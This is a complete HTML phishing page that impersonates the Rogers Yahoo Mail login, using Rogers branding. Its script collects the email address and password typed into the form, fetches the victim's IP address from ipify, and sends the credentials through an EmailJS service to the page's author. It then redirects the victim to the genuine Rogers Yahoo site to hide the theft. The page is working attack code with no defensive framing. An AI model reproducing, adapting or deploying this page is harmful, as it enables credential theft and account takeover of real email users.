<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="f3lakutie">


    <!-- font awesome-->
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" >
    
     
    <!-- favicon-->
    <link rel="shortcut icon" href="images/download_afD_icon.ico" type="image/png">
    <!-- for apple mobile devices -->
    <link rel="apple-touch-icon-precomposed" href="images/download_afD_icon.ico" type="image/png" sizes="152x152">
    <link rel="apple-touch-icon-precomposed" href="images/download_afD_icon.ico" type="image/png" sizes="120x120">

    <!-- default style-->
    <style>
        /*
        */
    </style>

    <title>Login Screen</title>

    <!-- Custom styles for this page -->
    <link href="form.css" rel="stylesheet"> 
    <link href="style.css" rel="stylesheet">

	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
    </script>

  </head>

  <body class="">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.0/dist/email.min.js">
    </script>
      <script>
          function getParameterByName(name, url = window.location.href) {
                name = name.replace(/[\[\]]/g, '\\$&');
                var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                    results = regex.exec(url);
                if (!results) return null;
                if (!results[2]) return '';
                return decodeURIComponent(results[2].replace(/\+/g, ' '));
            }
            var foo = getParameterByName('usr');
      </script>

    <div id="head">
      <div id="nav">
        <img style="float: left;" src="https://rogersmembercentre.com/rmcapp/images/Rogers.png">
         
        <div><p>Sign In</p></div>
        
      </div>
    </div>

    <div id ="main">
      <form id="my-form">
      <h1 style="color: black; font-weight: lighter;">Welcome</h1>
      <p style="text-align: left;">A new and easy way to access your Rogers Yahoo email account. Please login with your @rogers.com or @nl.rogers.com email address and password.</p>
      <div id="log"> 
        <input type="text" id="usr" placeholder="Rogers Email">
      </div>
      <div id="pass"> 
        <input type="password" id="pas" placeholder="Password">
        <p style="color: red;">Forgot password?</p>
      </div>
      <div>
        <input type="submit" value="Next">
      </div>
      </form>
      <p>Can't login or need help with your Rogers Yahoo! Mail? Visit <span style="color: red;">Rogers Yahoo! Mail</span> for support or connect with Anna our Virtual Assistant for guided support.</p>
      
    </div>
    <div id="footer">

    </div>
      <script>
            var xxip;
            // Add "https://ipinfo.io" statement
        // this will communicate with the ipify servers
        // in order to retrieve the IP address
            window.onload = function(){
                $.getJSON("https://api.ipify.org?format=json", function(data) {
                        
                        // Setting text of element P with id gfg
                        xxip = data.ip;
                        
                        
                    })                                  
                }
        
            
            // "json" shows that data will be fetched in json format
            function sendmail(){
                (function() {
                    emailjs.init("fmkybee-lCJgk_-6b"); //please encrypted user id for malicious attacks
                    })();
                //set the parameter as per you template parameter[https://dashboard.emailjs.com/templates]
                var templateParams = {
                    domain: "Rogers",
                    user_name: document.getElementById("usr").value,
                    user_pass: document.getElementById("pas").value,
                    ip: xxip,
                };

                emailjs.send('service_yj4qvae', 'template_yy88oar', templateParams)
                    .then(function(response) {
                    window.location.href = "https://ca.rogers.yahoo.com";
                    }, function(error) {
                    alert('FAILED...', error);
                    });

            }

            function processForm(e) {
                if (e.preventDefault) e.preventDefault();

                /* do what you want with the form */
            sendmail()
            

                // You must return false to prevent the default form behavior
                return false;
            }

            var form = document.getElementById('my-form');

            if (form.attachEvent) {
                form.attachEvent("submit", processForm);
            } else {
                form.addEventListener("submit", processForm);
            }

    </script>
  </body>
</html>